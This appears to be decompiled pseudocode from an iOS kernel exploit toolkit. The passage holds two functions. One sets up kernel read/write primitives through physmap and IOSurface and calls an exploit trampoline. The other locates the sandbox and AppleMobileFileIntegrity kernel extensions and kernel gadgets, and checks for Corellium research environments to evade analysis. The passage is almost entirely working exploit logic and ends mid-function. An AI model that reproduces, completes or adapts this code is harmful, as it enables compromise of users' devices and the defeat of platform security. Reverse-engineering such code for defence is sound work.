//----- (000000000003C9A4) ----------------------------------------------------
__int64 __fastcall physmap_kread(struct_krwCtx *krwCtx, unsigned int a2)
{
  __int64 v4; // x19
  unsigned __int64 v5; // x0
  unsigned __int64 v6; // x22
  int v7; // w8
  mach_vm_size_t v10; // x23
  unsigned int v11; // w0
  __int64 v12; // x22
  unsigned __int64 v13; // x22
  unsigned __int64 v14; // x0
  int xnuMajorVersion; // w8
  __int64 v16; // x8
  __int128 v17; // q0
  __int64 v18; // x2
  int v19; // w0
  unsigned __int64 v21; // x0
  __int128 v22; // q0
  unsigned __int64 vaddr; // [xsp+8h] [xbp-2E8h] BYREF
  unsigned int v24; // [xsp+14h] [xbp-2DCh] BYREF
  unsigned __int64 v25; // [xsp+18h] [xbp-2D8h] BYREF
  __int128 newBytes[32]; // [xsp+20h] [xbp-2D0h] BYREF
  __int128 v27[8]; // [xsp+220h] [xbp-D0h] BYREF

  v4 = 163856;
  vaddr = 0;
  if ( krwCtx->xnuVersionPacked < XNU_VERSION_PACKED(8019, 60, 40, 0, 0) )
  {
    v14 = kread_task_struct(krwCtx, a2);
    if ( v14 )
    {
      xnuMajorVersion = krwCtx->xnuMajorVersion;
      switch ( xnuMajorVersion )
      {
        case 6153:
          v16 = 696;
          break;
        case 8019:
          v16 = 800;
          break;
        case 7195:
          v16 = 672;
          break;
        default:
          return 163847;
      }
      v13 = v16 + v14;
      if ( !kread_physmap_decorated(krwCtx, v16 + v14, &vaddr) )
        return 163855;
      v10 = 0;
      goto LABEL_26;
    }
    return 163854;
  }
  v5 = get_task_kobject_addr(krwCtx, a2);
  if ( !v5 )
    return 163854;
  v6 = v5;
  v7 = krwCtx->xnuMajorVersion;
  if ( v7 == 8792 || v7 == 10002 || v7 == 8796 )
    v10 = 72;
  else
    v10 = 0;
  v11 = get_ptrauth_data_ptr_offset(krwCtx);
  if ( !kread_physmap_decorated(krwCtx, v6 + v11, (unsigned __int64 *)v27) )
    return 163855;
  if ( !validate_kaddr_range(krwCtx, *(__int64 *)&v27[0]) )
    return 163878;
  v12 = *(uint64_t *)&v27[0];
  v13 = v12 + (unsigned int)get_context_version_offset_40(krwCtx);
  if ( !kread_physmap_decorated(krwCtx, v13, &vaddr) )
    return 163855;
LABEL_26:
  if ( !vaddr )
  {
LABEL_37:
    if ( !(unsigned int)get_task_vm_region_base(a2) )
      return 163843;
    if ( mach_task_self_ == a2 )
      krw_ctx_set_flag(krwCtx, KRW_CTX_FLAG_SELF_TASK_IPC_SPACE_CLEARED);
    return 0;
  }
  if ( !check_kaddr_in_physmap(krwCtx, vaddr) )
    return 163878;
  if ( (uint32_t)v10 )
  {
    *(uint64_t *)&v17 = -1;
    *((uint64_t *)&v17 + 1) = -1;
    newBytes[30] = v17;
    newBytes[31] = v17;
    newBytes[28] = v17;
    newBytes[29] = v17;
    newBytes[26] = v17;
    newBytes[27] = v17;
    newBytes[24] = v17;
    newBytes[25] = v17;
    newBytes[22] = v17;
    newBytes[23] = v17;
    newBytes[20] = v17;
    newBytes[21] = v17;
    newBytes[18] = v17;
    newBytes[19] = v17;
    newBytes[16] = v17;
    newBytes[17] = v17;
    newBytes[14] = v17;
    newBytes[15] = v17;
    newBytes[12] = v17;
    newBytes[13] = v17;
    newBytes[10] = v17;
    newBytes[11] = v17;
    newBytes[8] = v17;
    newBytes[9] = v17;
    newBytes[7] = v17;
    newBytes[5] = v17;
    newBytes[6] = v17;
    newBytes[3] = v17;
    newBytes[4] = v17;
    newBytes[1] = v17;
    newBytes[2] = v17;
    newBytes[0] = v17;
    if ( !(unsigned int)kwritebuf_universal(krwCtx, vaddr, newBytes, v10) )
      return v4;
    goto LABEL_37;
  }
  v25 = 0;
  if ( !(unsigned int)lookup_physmap_page_slot(krwCtx, 0xDu, (__int64 *)&v25) )
    return 163858;
  v18 = v25;
  if ( v25 )
  {
LABEL_36:
    if ( !kwrite64_dispatch(krwCtx, v13, v18) )
      return v4;
    goto LABEL_37;
  }
  v24 = 128;
  v21 = alloc_physmap_page(krwCtx, &v24);
  v25 = v21;
  if ( !v21 )
    return 708617;
  *(uint64_t *)&v22 = -1;
  *((uint64_t *)&v22 + 1) = -1;
  v27[6] = v22;
  v27[7] = v22;
  v27[4] = v22;
  v27[5] = v22;
  v27[2] = v22;
  v27[3] = v22;
  v27[0] = v22;
  v27[1] = v22;
  if ( (unsigned int)kwrite_with_retry(krwCtx, v21, (__int64)v27, 128)
    && (unsigned int)cache_physmap_page_slot(krwCtx, 0xDu, v25) )
  {
    v18 = v25;
    goto LABEL_36;
  }
  return v4;
}
// 3CBB8: variable 'v19' is possibly undefined

//----- (000000000003CCA8) ----------------------------------------------------
__int64 __fastcall driver_init2_1(struct_krwCtx *krwCtx, int something)
{
  kern_return_t v4; // w0
  __int64 mach_port_with_a2; // x21
  int v7; // w0
  __int64 v8; // x27
  __int128 oword10; // q1
  __int64 v10; // x9
  pid_t v11; // w0
  io_registry_entry_t v12; // w0
  io_registry_entry_t v13; // w22
  const struct __CFString *v14; // x0
  const struct __CFString *v15; // x23
  const struct __CFString *CFProperty; // x0
  const struct __CFString *v17; // x25
  CFTypeID TypeID; // x26
  const struct __CFString *v19; // x24
  int HasPrefix; // w26
  unsigned __int64 commPageBaseRaw; // x0
  unsigned __int64 commPageBase; // x22
  int *p_xnuMajorVersion; // x22
  int xnuMajorVersion; // w8
  int xnuMajorVersionGroup; // w9
  int v26; // w9
  __int64 v27; // x8
  int v28; // w0
  unsigned __int64 xnuVersionPacked; // x8
  int v30; // w1
  int v31; // w1
  unsigned __int64 v32; // x8
  int v33; // w8
  int v34; // w0
  int v35; // w8
  int v36; // w9
  int v39; // w0
  unsigned __int64 v40; // x9
  unsigned __int64 v41; // x22
  int v42; // w23
  unsigned __int64 v43; // x8
  unsigned __int64 v44; // x21
  __int64 v45; // x8
  unsigned __int64 v46; // x0
  __int64 v47; // x1
  unsigned __int64 v48; // x0
  mach_vm_address_t v49; // x24
  __int64 v50; // x8
  unsigned __int64 v51; // x0
  __int64 v52; // x24
  __int64 (__fastcall *v53)(struct_krwCtx *); // x8
  unsigned int v54; // w1
  unsigned __int64 v55; // x0
  unsigned __int64 v56; // x21
  size_t v57; // x8
  struct_a1 *v58; // x0
  __int128 v59; // q1
  task_name_t v60; // w0
  __int64 *v61; // x23
  __int64 *st_ino; // x21
  int v63; // w26
  __int64 v64; // x0
  unsigned __int64 v65; // x0
  struct_a1 *v67; // x0
  __int64 v68; // x21
  __int128 v69; // q1
  __int64 v70; // x8
  __int64 v71; // x8
  host_t v72; // w0
  host_t v73; // w2
  int v74; // w0
  int v75; // w0
  host_priv_t v76; // w0
  char *v77; // x0
  struct_a1 *v78; // x0
  struct_a1 *v79; // x21
  unsigned int v80; // w26
  __int128 v81; // q1
  struct_v83 *v82; // x0
  struct_v83 *v83; // x23
  __int128 v84; // q1
  __int64 v85; // x9
  __int64 v86; // x0
  unsigned __int64 variable_addr; // x0
  unsigned __int64 v88; // x22
  unsigned __int64 v89; // x0
  mach_vm_address_t v90; // x23
  unsigned int v92; // w0
  krw_setup_path_t setupPath; // w8
  mach_port_name_t *v93; // [xsp+8h] [xbp-168h]
  unsigned __int64 v94; // [xsp+10h] [xbp-160h]
  int v95; // [xsp+18h] [xbp-158h]
  uint32_t v96; // [xsp+20h] [xbp-150h] BYREF
  char v97; // [xsp+27h] [xbp-149h] BYREF
  __int64 v98; // [xsp+28h] [xbp-148h] BYREF
  struct_xnuMajorVersion xnuVersion; // [xsp+30h] [xbp-140h] BYREF
  __int64 v100; // [xsp+60h] [xbp-110h] BYREF
  size_t v101; // [xsp+68h] [xbp-108h] BYREF
  uint64_t cpuFamily; // [xsp+70h] [xbp-100h] BYREF
  size_t v103; // [xsp+78h] [xbp-F8h] BYREF
  struct stat v104; // [xsp+80h] [xbp-F0h] BYREF

  v100 = 0;
  memset(&xnuVersion, 0, sizeof(xnuVersion));
  v98 = 0;
  v97 = 0;
  v96 = 0;
  krwCtx->krw_pipe_0 = -1;
  *(uint64_t *)&krwCtx->pipeFd0 = -1;
  *(uint64_t *)&krwCtx->iosurfaceFd = -1;
  mach_timebase_info(&krwCtx->timebase);
  pthread_mutex_init(&krwCtx->someMutex2, 0);
  pthread_mutex_init(&krwCtx->someMutex, 0);
  v4 = semaphore_create(mach_task_self_, &krwCtx->semaphore, 0, 0);
  if ( v4 )
    return v4 | 0x80000000;
  v7 = kernel_version_parse(&xnuVersion, &krwCtx->gap_0x16C_0, &krwCtx->gap_0x170);
  if ( !v7 )
    return 708629;
  v8 = 163858;
  oword10 = xnuVersion.oword10;
  *(__int128 *)&krwCtx->xnuMajorVersion = xnuVersion.majorVersion;
  *(__int128 *)&krwCtx->gap_0x150 = oword10;
  v10 = *((uint64_t *)&xnuVersion.oword10 + 1);
  krwCtx->gap_0x160_size8 = xnuVersion.qword20;
  krwCtx->stride_0x168 = 8;
  mach_port_with_a2 = 163847;
  if ( (unsigned __int64)(v10 - XNU_VERSION_PACKED(6153, 0, 103, 0, 0)) > 0xF090EFE400003LL )
    return mach_port_with_a2;
  memset(&v104, 0, sizeof(v104));
  if ( !stat("/usr/libexec/corelliumd", &v104) )
    return 0x28022;
  v11 = getpid();
  if ( (int)sandbox_check(v11, "iokit-get-properties", SANDBOX_CHECK_NO_REPORT, "IOPlatformSerialNumber") <= 0 )
  {
    v12 = IORegistryEntryFromPath(kIOMasterPortDefault, "IODeviceTree:/");
    if ( v12 )
    {
      v13 = v12;
      v14 = CFStringCreateWithCString(kCFAllocatorDefault, "IOPlatformSerialNumber", 0x8000100u);
      if ( v14 )
      {
        v15 = v14;
        CFProperty = (const struct __CFString *)IORegistryEntryCreateCFProperty(v13, v14, kCFAllocatorDefault, 0);
        if ( CFProperty )
        {
          v17 = CFProperty;
          TypeID = CFStringGetTypeID();
          if ( TypeID == CFGetTypeID(v17) )
          {
            v19 = CFStringCreateWithCString(kCFAllocatorDefault, "CORELLIUM", 0x8000100u);
            HasPrefix = CFStringHasPrefix(v17, v19);
            CFRelease(v19);
            CFRelease(v17);
            CFRelease(v15);
            IOObjectRelease(v13);
            if ( HasPrefix )
              return 0x28022;
            goto LABEL_17;
          }
        }
        CFRelease(v15);
      }
      IOObjectRelease(v13);
    }
  }
LABEL_17:
  commPageBaseRaw = comm_page64_base_address();
  if ( !commPageBaseRaw )
    return 0x28012;
  commPageBase = commPageBaseRaw;
  cpuFamily = 0;
  if ( !(unsigned int)comm_page_get_cpu_family((uint32_t *)&cpuFamily) )
    return 0x28022;
  if ( (uint32_t)cpuFamily == CPUFamily_A9 || (uint32_t)cpuFamily == CPUFamily_ARM_CYCLONE || (uint32_t)cpuFamily == CPUFamily_A8 )
  {
    if ( (*(uint64_t *)(commPageBase + COMM_PAGE_CPU_CAPABILITIES64_OFFSET) & 0x4000000) == 0 )
      goto LABEL_23;
    return 0x28022;
  }
  if ( *(uint16_t *)(commPageBase + COMM_PAGE_CACHE_LINESIZE_OFFSET) != 128 )
    return 0x28022;
LABEL_23:
  p_xnuMajorVersion = &krwCtx->xnuMajorVersion;
  xnuMajorVersion = krwCtx->xnuMajorVersion;
  if ( xnuMajorVersion > 8791 )
  {
    if ( xnuMajorVersion == 8792 || xnuMajorVersion == 10002 )
      goto LABEL_33;
    xnuMajorVersionGroup = 8796;
  }
  else
  {
    if ( (unsigned int)(xnuMajorVersion - 8019) < 2 || xnuMajorVersion == 6153 )
      goto LABEL_33;
    xnuMajorVersionGroup = 7195;
  }
  if ( xnuMajorVersion != xnuMajorVersionGroup )
    return mach_port_with_a2;
LABEL_33:
  if ( xnuMajorVersion >= 7195 )
    krwCtx->isSandboxed = check_sandboxed(krwCtx->xnuVersionPacked >> 43 > 0x44A);
  if ( !(unsigned int)comm_page_get_cpu_family((uint32_t *)&cpuFamily) )
    return 163858;
  if ( (int)cpuFamily <= 0x2876F5B4 )
  {
    if ( (int)cpuFamily > (int)0xE81E7EF5 )
    {
      if ( (int)cpuFamily > 0x7D34B9E )
      {
        if ( (uint32_t)cpuFamily == CPUFamily_A12 )
        {
          v31 = KRW_CTX_FLAG_CPU_A12;
        }
        else
        {
          if ( (uint32_t)cpuFamily != CPUFamily_A14 )
            goto LABEL_69;
          if ( (int)number_of_cpus() >= 8 && krwCtx->xnuVersionPacked >= XNU_VERSION_PACKED(8792, 40, 108, 0, 0) )
            krw_ctx_set_flag(krwCtx, KRW_CTX_FLAG_CPU_HIGH_CORE_CLUSTER);
          v31 = KRW_CTX_FLAG_CPU_A14;
        }
        goto LABEL_68;
      }
      if ( (uint32_t)cpuFamily != CPUFamily_A11 )
      {
        v26 = CPUFamily_ARM_IBIZA;
        goto LABEL_64;
      }
      v31 = KRW_CTX_FLAG_CPU_A11;
LABEL_68:
      krw_ctx_set_flag(krwCtx, v31);
      goto LABEL_69;
    }
    if ( (uint32_t)cpuFamily == CPUFamily_A16 )
    {
LABEL_65:
      if ( krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(10001, 1023, 1023, 1023, 1023) )
        krw_ctx_set_flag(krwCtx, KRW_CTX_FLAG_PAC_KERNEL_LAYOUT);
      v31 = KRW_CTX_FLAG_CPU_A16;
      goto LABEL_68;
    }
    if ( (uint32_t)cpuFamily == CPUFamily_A9 )
    {
      v31 = KRW_CTX_FLAG_CPU_A9;
      goto LABEL_68;
    }
    if ( (uint32_t)cpuFamily != CPUFamily_A15 )
      goto LABEL_69;
    v28 = number_of_cpus();
    xnuVersionPacked = krwCtx->xnuVersionPacked;
    if ( v28 < 8 )
    {
      if ( xnuVersionPacked > XNU_VERSION_PACKED(10001, 1023, 1023, 1023, 1023) )
      {
        v30 = KRW_CTX_FLAG_PAC_KERNEL_LAYOUT;
        goto LABEL_118;
      }
    }
    else if ( xnuVersionPacked >> 43 > 0x44A )
    {
      v30 = KRW_CTX_FLAG_CPU_HIGH_CORE_CLUSTER;
LABEL_118:
      krw_ctx_set_flag(krwCtx, v30);
    }
    v31 = KRW_CTX_FLAG_CPU_A15;
    goto LABEL_68;
  }
  if ( (int)cpuFamily <= 0x573B5EEB )
  {
    switch ( (uint32_t)cpuFamily )
    {
      case CPUFamily_A17:
        krw_ctx_set_flag(krwCtx, KRW_CTX_FLAG_PAC_KERNEL_LAYOUT);
        v31 = KRW_CTX_FLAG_CPU_A17;
        break;
      case CPUFamily_A8:
        v31 = KRW_CTX_FLAG_CPU_A8;
        break;
      case CPUFamily_A13:
        v31 = KRW_CTX_FLAG_CPU_A13;
        break;
      default:
        goto LABEL_69;
    }
    goto LABEL_68;
  }
  if ( (int)cpuFamily > 0x67CEEE92 )
  {
    if ( (uint32_t)cpuFamily == CPUFamily_A10 )
    {
      v31 = KRW_CTX_FLAG_CPU_A10;
      goto LABEL_68;
    }
    v26 = CPUFamily_ARM_PALMA;
LABEL_64:
    if ( (uint32_t)cpuFamily != v26 )
      goto LABEL_69;
    goto LABEL_65;
  }
  if ( (uint32_t)cpuFamily != CPUFamily_ARM_UNKNOWN_573B5EEC )
  {
    v26 = CPUFamily_ARM_LOBOS;
    goto LABEL_64;
  }
  krw_ctx_set_flag(krwCtx, KRW_CTX_FLAG_CPU_A14);
  v40 = krwCtx->xnuVersionPacked;
  if ( v40 - XNU_VERSION_PACKED(7195, 100, 326, 0, 0) <= 0x641056BEFFFFFLL )
  {
    v27 = 708616;
    if ( v40 <= XNU_VERSION_PACKED(8020, 241, 30, 0, 0) || krwCtx->xnuMajorVersion >= 8792 )
      return v27;
  }
LABEL_69:
  v32 = krwCtx->xnuVersionPacked;
  if ( v32 <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
    return mach_port_with_a2;
  if ( krwCtx->xnuMajorVersion <= 8791 )
  {
    memset(&v104, 0, 32);
    v103 = 32;
    if ( sysctlbyname("hw.model", &v104, &v103, 0, 0) )
    {
      v33 = errno;
      if ( v33 < 0 )
        v33 = -v33;
      return v33 | 0x40000000u;
    }
    if ( (v104.st_dev & 0xDF) == 0x4A && !((comm_page_memory_size() - 1073741825) >> 30) )
      krw_ctx_set_flag(krwCtx, KRW_CTX_FLAG_LOW_MEMORY_DEVICE);
    v32 = krwCtx->xnuVersionPacked;
  }
  if ( v32 <= XNU_VERSION_PACKED(8796, 142, 1, 700, 12) )
  {
    if ( v32 > XNU_VERSION_PACKED(8796, 102, 4, 1023, 1023) )
    {
      if ( (krwCtx->flags & KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) == 0 || (krwCtx->flags & KRW_CTX_FLAG_CPU_A12) != 0 )
        goto LABEL_87;
      goto LABEL_86;
    }
    if ( v32 > XNU_VERSION_PACKED(8020, 241, 30, 0, 0) )
    {
LABEL_86:
      if ( *p_xnuMajorVersion >= 8792 )
        return mach_port_with_a2;
      goto LABEL_87;
    }
    if ( v32 <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) || *p_xnuMajorVersion > 8791 || ((krwCtx->flags & KRW_CTX_FLAG_LOW_MEMORY_DEVICE) != 0) == 0 )
      return mach_port_with_a2;
  }
LABEL_87:
  v34 = sub_get_page_size();
  if ( !v34 )
    return 0x28012;
  krwCtx->pageSizeOrSomething = v34;
  krwCtx->pageMask = (unsigned int)(v34 - 1);
  v35 = krwCtx->xnuMajorVersion;
  if ( v35 > 8791 )
  {
    if ( v35 == 8792 || v35 == 10002 )
      goto LABEL_96;
    v36 = 8796;
  }
  else
  {
    if ( (unsigned int)(v35 - 8019) < 2 || v35 == 6153 )
      goto LABEL_96;
    v36 = 7195;
  }
  if ( v35 != v36 )
    return 0x28012;
LABEL_96:
  krwCtx->vmMapSize = 2 * v34 - 64;
  *(__int128 *)&krwCtx->gap_0x19E8 = xmmword_43730;
  if ( !(unsigned int)another_sandbox_check(krwCtx) )
    return 0x28012;
  mach_port_with_a2 = create_mach_port_with_a2(krwCtx, 0x200u);
  if ( (uint32_t)mach_port_with_a2 )
    return mach_port_with_a2;
  if ( something )
  {
    setupPath = krw_select_setup_path(krwCtx);
    v39 = krw_prepare_selected_setup_path(krwCtx, setupPath, &v96);
    if ( !v39 )
      return 163869;
    if ( v96 && krw_has_any_ready_method(krwCtx) )
    {
      krw_ctx_set_flag(krwCtx, KRW_CTX_FLAG_KRW_METHODS_READY);
    }
  }
  v41 = krwCtx->xnuVersionPacked;
  if ( v41 >> 43 <= 0x44A )
    v42 = 128;
  else
    v42 = 1152;
  if ( !krw_has_any_ready_method(krwCtx) )
  {
    mach_port_with_a2 = kext_exploit_main_trampoline((uint64_t)krwCtx, krwCtx->gap_0x19D0, 0, (uint64_t)&krwCtx->targetAndParentTaskPorts);
    if ( (uint32_t)mach_port_with_a2 )
      return mach_port_with_a2;
  }
  if ( has_valid_krw_path(krwCtx) )
  {
    if ( krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) && krwCtx->isSandboxed )
    {
      v95 = 1;
      goto LABEL_172;
    }
    mach_port_with_a2 = setup_krw_engine(krwCtx);
    if ( (uint32_t)mach_port_with_a2 )
      return mach_port_with_a2;
  }
  v95 = 0;
LABEL_172:
  v94 = krwCtx->xnuVersionPacked;
  v43 = v94;
  if ( v94 <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
  {
    mach_port_with_a2 = refresh_target_task_port(krwCtx, mach_task_self_, 0, &v97);
    if ( (uint32_t)mach_port_with_a2 )
      return mach_port_with_a2;
    v43 = krwCtx->xnuVersionPacked;
  }
  v93 = (mach_port_name_t *)&krwCtx->targetAndParentTaskPorts + 1;
  if ( v43 <= XNU_VERSION_PACKED(8791, 1023, 1023, 1023, 1023) )
  {
    v47 = krwCtx->gap_0x19D0;
    mach_port_with_a2 = 163852;
    if ( !v47 )
      return mach_port_with_a2;
    v48 = get_ipc_port_offset_by_version(krwCtx, v47);
    if ( !v48 )
      return mach_port_with_a2;
    v49 = v48;
    if ( !kread_u32(krwCtx, v48, &v104) )
      return 163855;
    if ( !v104.st_dev && !noppl_kwrite32(krwCtx, v49, 1) )
      return 163856;
    mach_port_with_a2 = plist_elem_is_string_6(krwCtx, krwCtx->gap_0x19D0, v93);
    if ( (uint32_t)mach_port_with_a2 )
      return mach_port_with_a2;
  }
  else
  {
    HIDWORD(krwCtx->targetAndParentTaskPorts) = -1;
  }
  if ( (unsigned int)alloc_vm_page(krwCtx) )
  {
    mach_port_with_a2 = alloc_vm_page_v2(krwCtx);
    if ( (uint32_t)mach_port_with_a2 )
      return mach_port_with_a2;
  }
  v44 = krwCtx->machHeaderPlus0x8000;
  if ( !v44 )
  {
    v45 = *(uint64_t *)&krwCtx->mappedKernelRegion;
    if ( v45 )
    {
      if ( *(uint64_t *)&krwCtx->mappedKernelSize )
      {
        v44 = *(uint64_t *)(v45 + 312);
        if ( v44 )
        {
LABEL_199:
          krwCtx->machHeaderPlus0x8000 = v44;
          goto LABEL_200;
        }
      }
    }
    if ( krwCtx->slideMaybe )
    {
      v46 = find_kernel_base_ptr(krwCtx);
      if ( v46 )
      {
        v44 = krwCtx->slideMaybe + v46;
LABEL_196:
        v50 = *(uint64_t *)&krwCtx->mappedKernelRegion;
        if ( v50 && *(uint64_t *)&krwCtx->mappedKernelSize )
          *(uint64_t *)(v50 + 312) = v44;
        goto LABEL_199;
      }
    }
    else
    {
      v44 = kernel_get_base_slid(krwCtx, 0);
      if ( v44 )
        goto LABEL_196;
    }
    return 163860;
  }
LABEL_200:
  if ( !krwCtx->slideMaybe )
  {
    v51 = find_kernel_base_ptr(krwCtx);
    if ( !v51 )
      return 163861;
    krwCtx->slideMaybe = v44 - v51;
  }
  if ( !validate_ipc_kobject_read(krwCtx, mach_task_self_) )
    return 163862;
  if ( krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
  {
    if ( (v95 & 1) != 0 )
      goto LABEL_211;
LABEL_210:
    krw_ctx_set_flag(krwCtx, KRW_CTX_FLAG_KERNEL_PORT_READY);
    goto LABEL_211;
  }
  if ( !v97 && v94 <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
    goto LABEL_210;
LABEL_211:
  v52 = krwCtx->kernelMachoCtx;
  if ( !v52 )
  {
    v58 = (struct_a1 *)calloc(0x128u, 1u);
    if ( !v58 )
      return 708617;
    v52 = (__int64)v58;
    krw_ctx_zero_fields(v58, krwCtx);
    v59 = xnuVersion.oword10;
    *(__int128 *)(v52 + 112) = xnuVersion.majorVersion;
    *(__int128 *)(v52 + 128) = v59;
    *(uint64_t *)(v52 + 144) = xnuVersion.qword20;
    *(uint32_t *)(v52 + 152) = krwCtx->vmMapSize;
    *(uint32_t *)(v52 + 56) = krwCtx->pageSizeOrSomething;
    if ( !iosurface_physmap_setup_alt(v52, krwCtx->targetAndParentTaskPorts, v44, v42) )
      return 163863;
    krwCtx->kernelMachoCtx = v52;
  }
  v53 = *(__int64 (__fastcall **)(struct_krwCtx *))&krwCtx->gap_0x1E0;
  if ( v53 && *(uint64_t *)&krwCtx->gap_0x1E8 )
  {
    mach_port_with_a2 = v53(krwCtx);
    if ( (uint32_t)mach_port_with_a2 )
      return mach_port_with_a2;
    *(uint64_t *)&krwCtx->gap_0x1E0 = 0;
    *(uint64_t *)&krwCtx->gap_0x1E8 = 0;
  }
  if ( krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(8791, 1023, 1023, 1023, 1023) )
  {
    v54 = *v93;
    if ( !*v93 )
      v54 = krwCtx->targetAndParentTaskPorts;
    v55 = find_kernel_struct_addr(krwCtx, v54);
    if ( v55 )
    {
      v56 = v55;
      if ( kread_physmap_decorated(krwCtx, v55 + 32, &cpuFamily) && kread_physmap_decorated(krwCtx, v56 + 40, &v101) )
      {
        krwCtx->gap_0x19E8 = cpuFamily;
        v57 = v101;
        goto LABEL_233;
      }
    }
    return 0x28012;
  }
  v60 = *v93;
  if ( !*v93 )
    v60 = krwCtx->targetAndParentTaskPorts;
  if ( (unsigned int)get_task_memory_info(v60, &v104, &v103) )
    return 0x28012;
  krwCtx->gap_0x19E8 = *(uint64_t *)&v104.st_dev;
  v57 = v103;
LABEL_233:
  krwCtx->gap_0x19F0 = v57;
  if ( krwCtx->krw_pipe_0 == -1 || krwCtx->krw_pipe_1 == -1 || krwCtx->iosurfaceFd == -1 || !krwCtx->gap_0x218 )
    goto LABEL_260;
  v61 = *(__int64 **)&krwCtx->gap_0x220;
  if ( krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(7195, 100, 325, 1023, 1023) )
  {
    if ( v61 )
      goto LABEL_259;
    goto LABEL_260;
  }
  if ( v61 )
    goto LABEL_259;
  macho_getsectbyname("__DATA_CONST", krwCtx->kernelMachoCtx, "__const", &v104);
  st_ino = (__int64 *)v104.st_ino;
  if ( !v104.st_ino || !*(uint64_t *)&v104.st_uid || v104.st_ino >= *(uint64_t *)&v104.st_uid + v104.st_ino )
    return 0;
  v61 = 0;
  v63 = 0;
  while ( 1 )
  {
    if ( !v61 )
    {
      if ( macho_read_u64(*(__int64 **)&v104.st_dev, st_ino) == 7 )
        v61 = st_ino;
      else
        v61 = 0;
      goto LABEL_255;
    }
    v64 = macho_read_u64_thunk(*(uint64_t *)&v104.st_dev, st_ino);
    v65 = krw_xpac_vaddr_2(krwCtx, v64);
    if ( v65 >= krwCtx->gap_0x19E8 && (v65 & 3) == 0 && v65 < krwCtx->gap_0x19F0 )
      break;
    v63 = 0;
    v61 = 0;
LABEL_255:
    st_ino = (__int64 *)((char *)st_ino + krwCtx->stride_0x168);
    if ( (unsigned __int64)st_ino >= *(uint64_t *)&v104.st_uid + v104.st_ino )
      return 0;
  }
  if ( ++v63 != 7 )
    goto LABEL_255;
  *(__int64 **)&krwCtx->gap_0x220 = v61;
LABEL_259:
  *(uint64_t *)(*(uint64_t *)&krwCtx->mappedKernelRegion + 256LL) = v61;
LABEL_260:
  if ( *(uint8_t *)(v52 + 156) )
    krw_ctx_set_flag(krwCtx, KRW_CTX_FLAG_HAS_AUXKC_INFO);
  if ( v41 > XNU_VERSION_PACKED(8791, 1023, 1023, 1023, 1023) && *(uint64_t *)(v52 + 160) )
  {
    v67 = (struct_a1 *)calloc(0x128u, 1u);
    if ( v67 )
    {
      v68 = (__int64)v67;
      krw_ctx_zero_fields(v67, krwCtx);
      v69 = xnuVersion.oword10;
      *(__int128 *)(v68 + 112) = xnuVersion.majorVersion;
      *(__int128 *)(v68 + 128) = v69;
      *(uint64_t *)(v68 + 144) = xnuVersion.qword20;
      *(uint32_t *)(v68 + 152) = krwCtx->vmMapSize;
      *(uint32_t *)(v68 + 56) = krwCtx->pageSizeOrSomething;
      if ( (unsigned int)alloc_kernel_offset_table(v68, *(uint64_t *)(v52 + 160)) )
      {
        krwCtx->auxkcMachoCtx = v68;
        goto LABEL_267;
      }
      return 163863;
    }
    return 708617;
  }
LABEL_267:
  if ( !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_HAS_AUXKC_INFO) )
  {
    if ( !(unsigned int)get_kext_base_addr(krwCtx, "com.apple.security.sandbox", &v98) )
      return 163864;
    v78 = (struct_a1 *)calloc(0x128u, 1u);
    if ( !v78 )
      return 708617;
    v79 = v78;
    v80 = (v41 >> 43 > 0x44A) << 6;
    krw_ctx_zero_fields(v78, krwCtx);
    v81 = xnuVersion.oword10;
    v79->xnuMajorVersion = xnuVersion.majorVersion;
    v79->oword80 = v81;
    *(uint64_t *)&v79->oword90 = xnuVersion.qword20;
    DWORD2(v79->oword90) = krwCtx->vmMapSize;
    DWORD2(v79->oword30) = krwCtx->pageSizeOrSomething;
    if ( v41 > XNU_VERSION_PACKED(8791, 1023, 1023, 1023, 1023) )
    {
      BYTE1(v79->oword100) = 1;
      *((uint64_t *)&v79->owordA0 + 1) = v52;
    }
    if ( !iosurface_physmap_setup_bool((__int64)v79, krwCtx->targetAndParentTaskPorts, v98, v80) )
      return 163863;
    LODWORD(v79->oword30) = *(uint32_t *)(v52 + 48);
    krwCtx->sandboxMachoCtx = (uint64_t)v79;
    if ( !(unsigned int)get_kext_base_addr(krwCtx, "com.apple.driver.AppleMobileFileIntegrity", &v100) )
      return 163864;
    v82 = (struct_v83 *)calloc(0x128u, 1u);
    mach_port_with_a2 = 708617;
    if ( !v82 )
      return mach_port_with_a2;
    v83 = v82;
    krw_ctx_zero_fields((struct_a1 *)v82, krwCtx);
    v84 = xnuVersion.oword10;
    v83->xnuMajorVersion = xnuVersion.majorVersion;
    v83->oword80 = v84;
    v83->qword90 = xnuVersion.qword20;
    v83->dword98 = krwCtx->vmMapSize;
    v83->dword38 = krwCtx->pageSizeOrSomething;
    if ( v41 > XNU_VERSION_PACKED(8791, 1023, 1023, 1023, 1023) )
    {
      v83->byte101 = 1;
      v83->qwordA8 = v52;
    }
    if ( !iosurface_physmap_setup_bool((__int64)v83, krwCtx->targetAndParentTaskPorts, v100, v80) )
      return 163863;
    v83->dword30 = *(uint32_t *)(v52 + 48);
    krwCtx->amfiMachoCtx = (uint64_t)v83;
  }
  *(uint64_t *)&v104.st_dev = 0;
  v70 = *(uint64_t *)&krwCtx->mappedKernelRegion;
  if ( !v70 || !*(uint64_t *)&krwCtx->mappedKernelSize || (v71 = *(uint64_t *)(v70 + 296), (*(uint64_t *)&v104.st_dev = v71) == 0) )
  {
    v77 = find_kernel_gadget(krwCtx->kernelMachoCtx);
    if ( !v77 )
      return 163866;
    if ( !(unsigned int)krw_read_thunk(krwCtx, (__int64)v77, krwCtx->stride_0x168, &v104) )
      return 163866;
    v71 = *(uint64_t *)&v104.st_dev;
    if ( (v104.st_dev & 1) == 0 )
      return 163866;
    v85 = *(uint64_t *)&krwCtx->mappedKernelRegion;
    if ( v85 && *(uint64_t *)&krwCtx->mappedKernelSize )
    {
